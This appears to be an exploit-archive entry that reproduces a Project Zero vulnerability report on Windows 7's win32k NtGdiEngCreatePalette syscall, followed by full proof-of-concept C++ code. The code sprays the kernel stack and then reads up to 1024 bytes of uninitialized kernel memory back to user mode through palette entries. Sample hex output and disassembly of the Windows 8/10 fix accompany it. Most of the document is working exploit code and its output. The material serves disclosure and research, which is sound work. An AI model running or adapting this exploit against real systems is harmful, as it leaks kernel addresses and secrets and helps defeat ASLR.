@@ -1,0 +1,204 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1276&desc=2
+
+We have discovered that the nt!NtGdiEngCreatePalette system call discloses large portions of uninitialized kernel stack memory to user-mode clients.
+
+This is caused by the fact that for palettes created in the PAL_INDEXED mode with up to 256 colors, a temporary stack-based buffer is used by the syscall for optimization (instead of locking the entire ring-3 memory area with win32k!bSecureBits). The stack memory region is not pre-initialized with zeros, but its contents may still be treated as valid palette colors by win32k!EngCreatePalette, in the special corner case when:
+
+ a) 1 <= cColors <= 256
+ b) pulColors == NULL
+
+The above setting causes the the win32k!bSafeReadBits to automatically succeed without actually reading any data from user-space, which further leads to the creation of a palette with colors set to uninitialized memory from the kernel stack (up to 1024 bytes!). These bytes can be subsequently read back using the GetPaletteEntries() API.
+
+The vulnerability is fixed in Windows 8 and 10, which have the following memset() calls at the beginning of the function:
+
+(Windows 8.1)
+--- cut ---
+.text:001B4B62                 push    3FCh            ; size_t
+.text:001B4B67                 lea     eax, [ebp+var_400]
+.text:001B4B6D                 mov     [ebp+var_404], edi
+.text:001B4B73                 push    edi             ; int
+.text:001B4B74                 push    eax             ; void *
+.text:001B4B75                 call    _memset
+--- cut ---
+
+(Windows 10)
+--- cut ---
+.text:002640C8                 push    400h            ; size_t
+.text:002640CD                 mov     [ebp+var_410], eax
+.text:002640D3                 lea     eax, [ebp+var_404]
+.text:002640D9                 push    edi             ; int
+.text:002640DA                 push    eax             ; void *
+.text:002640DB                 mov     [ebp+var_41C], ebx
+.text:002640E1                 call    _memset
+--- cut ---
+
+This indicates that Microsoft is aware of the bug but didn't backport the fix to systems earlier than Windows 8. The issue was in fact discovered by cross-diffing the list of memset calls between Windows 7 and Windows 10, which illustrates how easy it is to use exclusive patches for one system version to attack another.
+
+The attached proof-of-concept program demonstrates the disclosure by spraying the kernel stack with a large number of 0x41 ('A') marker bytes, and then calling the affected system call. An example output is as follows:
+
+--- cut ---
+00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000010: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000020: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000030: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000040: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000050: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000060: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000070: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000080: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000090: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000000a0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000000b0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000000c0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000000d0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000000e0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000000f0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000100: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000110: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000120: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000130: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000140: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000150: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000160: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000170: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000180: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000190: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000001a0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000001b0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000001c0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000001d0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000001e0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000001f0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000200: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000210: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000220: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000230: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000240: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000250: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000260: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000270: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000280: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000290: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000002a0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000002b0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000002c0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000002d0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000002e0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+000002f0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000300: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000310: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000320: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000330: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000340: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+00000350: 41 41 41 41 41 41 41 41 41 41 41 41 00 00 00 00 AAAAAAAAAAAA....
+00000360: 21 00 00 00 00 00 00 00 88 0d cf 8e da 3f 87 82 !............?..
+00000370: 09 50 14 00 04 00 00 00 00 dc 9d 98 25 82 5e 4d .P..........%.^M
+00000380: 00 00 00 00 f0 dd 9d 98 d0 09 96 82 12 01 00 00 ................
+00000390: 48 0d cf 8e 00 00 00 00 ae 01 00 00 6f 00 00 00 H...........o...
+000003a0: 00 00 00 00 7e 53 0c 00 1c fc 1c 9a a5 f0 87 82 ....~S..........
+000003b0: ef ff 07 00 12 01 00 00 40 58 14 00 cc f2 41 00 ........@X....A.
+000003c0: 01 00 00 00 01 00 00 00 f0 dd 9d 98 00 00 00 00 ................
+000003d0: 12 01 00 00 00 00 00 00 14 05 00 c0 25 82 5e 4d ............%.^M
+000003e0: 00 00 00 00 00 00 00 00 00 10 00 00 6c fb 1c 9a ............l...
+000003f0: 2c f9 1c 9a 67 08 00 00 67 08 00 00 48 0d cf 8e ,...g...g...H...
+--- cut ---
+
+The planted 0x41 bytes are clearly visible in the above hex dump. Since the stack spraying primitive used here (nt!NtMapUserPhysicalPages) still leaves some bytes intact at higher addresses, these bytes (containing a number of kernel-space addresses etc.) can be observed at offsets 0x360-0x400.
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winddi.h>
+#include <cstdio>
+
+extern "C"
+NTSTATUS WINAPI NtMapUserPhysicalPages(
+    PVOID BaseAddress,
+    ULONG NumberOfPages,
+    PULONG PageFrameNumbers
+);
+
+// For native 32-bit execution.
+extern "C"
+ULONG CDECL SystemCall32(DWORD ApiNumber, ...) {
+  __asm{mov eax, ApiNumber};
+  __asm{lea edx, ApiNumber + 4};
+  __asm{int 0x2e};
+}
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PVOID ptr, BYTE byte, ULONG size) {
+  PBYTE _ptr = (PBYTE)ptr;
+  for (ULONG i = 0; i < size; i++) {
+    _ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  // Buffer allocated in static program memory, hence doesn't touch the local stack.
+  static SIZE_T buffer[1024];
+
+  // Fill the buffer with 'A's and spray the kernel stack.
+  MyMemset(buffer, 'A', sizeof(buffer));
+  NtMapUserPhysicalPages(buffer, ARRAYSIZE(buffer), (PULONG)buffer);
+
+  // Make sure that we're really not touching any user-mode stack by overwriting the buffer with 'B's.
+  MyMemset(buffer, 'B', sizeof(buffer));
+}
+
+int main() {
+  // Windows 7 32-bit.
+  CONST ULONG __NR_NtGdiEngCreatePalette = 0x129c;
+
+  // Initialize the thread as GUI.
+  LoadLibrary(L"user32.dll");
+
+  // Fill the kernel stack with some marker 'A' bytes.
+  SprayKernelStack();
+
+  // Create a Palette object with 256 4-byte uninitialized colors from the kernel stack.
+  HPALETTE hpal = (HPALETTE)SystemCall32(__NR_NtGdiEngCreatePalette, PAL_INDEXED, 256, NULL, 0.0f, 0.0f, 0.0f);
+  if (hpal == NULL) {
+    printf("[-] NtGdiEngCreatePalette failed.\n");
+    return 1;
+  }
+
+  // Retrieve the uninitialized bytes back to user-mode.
+  PALETTEENTRY palentries[256] = { /* zero padding */ };
+  if (GetPaletteEntries(hpal, 0, 256, palentries) != 256) {
+    printf("[-] GetPaletteEntries failed.\n");
+    return 1;
+  }
+
+  // Dump the data on screen.
+  PrintHex((PBYTE)palentries, sizeof(palentries));
+
+  return 0;
+}
